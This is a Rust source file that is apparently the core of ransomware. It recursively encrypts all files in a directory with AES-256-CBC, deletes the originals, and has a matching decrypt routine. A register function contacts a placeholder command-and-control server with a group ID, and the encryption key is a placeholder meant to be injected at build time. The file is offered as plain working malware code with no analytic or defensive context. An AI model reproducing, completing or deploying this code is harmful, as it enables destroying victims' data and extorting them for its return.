extern crate aes;
extern crate block_modes;
extern crate hex;
extern crate rand;
extern crate walkdir;

use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use walkdir::{WalkDir, DirEntry};
use std::fs::File;
use std::fs;
use std::io::{Read, Write};
use std::error::Error;
use std::str::{self, FromStr};
use reqwest::blocking::{Client, Request};


type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const KEY: &[u8] = b"tobereplacedbybuildscript";
const IV: &[u8] = b"unique_initializ"; // IV should be 16 bytesA
const C2ADDR: &str = "c2serveraddr";
const GID: i32 = 4444;
                                

fn encrypt_file(input_path: &str, output_path: &str) -> Result<(), Box<dyn Error>> {
    // Read the input file
    let mut input_file = File::open(input_path)?;
    let mut buffer = Vec::new();
    input_file.read_to_end(&mut buffer)?;

    // Encrypt the data
    let cipher = Aes256Cbc::new_from_slices(KEY, IV)?;
    let ciphertext = cipher.encrypt_vec(&buffer);

    // Write the encrypted data to the output file
    let mut output_file = File::create(output_path)?;
    output_file.write_all(&ciphertext)?;

    Ok(())
}

fn decrypt_file(input_path: &str, output_path: &str) -> Result<(), Box<dyn Error>> {
    // Read the encrypted file
    let mut input_file = File::open(input_path)?;
    let mut buffer = Vec::new();
    input_file.read_to_end(&mut buffer)?;

    // Decrypt the data
    let cipher = Aes256Cbc::new_from_slices(KEY, IV)?;
    let decrypted_data = cipher.decrypt_vec(&buffer)?;

    // Write the decrypted data to the output file
    let mut output_file = File::create(output_path)?;
    output_file.write_all(&decrypted_data)?;

    Ok(())
}

fn is_app_data(entry: &DirEntry) -> bool {
    entry.path().components().any(|component| {
        component.as_os_str() == "AppData"
    })
}

fn get_all_files(dir: &str) -> Vec<String> {
    let mut file_paths = Vec::new();
    
    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()).filter(|e| !is_app_data(e)) {
        if entry.file_type().is_file() {
            file_paths.push(entry.path().display().to_string());
        }
    }
    
    file_paths
}


pub fn encrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
    let directory = get_all_files(directory_path);
    for mut file in directory {
        let encrypted_file_path = file.as_mut().to_owned() + ".enc";
        let _ = encrypt_file(&file, &encrypted_file_path);
        let _ = fs::remove_file(file);
    }
    Ok(())
}

pub fn decrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
    let directory = get_all_files(&directory_path);
    for mut file in directory {
        let mut file_path = file.as_mut().to_owned();
        let ext_index = file_path.rfind('.').unwrap();
        file_path.truncate(ext_index);
        let _ = decrypt_file(&file, &file_path);
        let _ = fs::remove_file(file);
    }
    Ok(())
}

pub fn register() -> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let url = format!("https://{C2ADDR}/client/{GID}/register");
    client.post(url).send()?;
    Ok(())
}
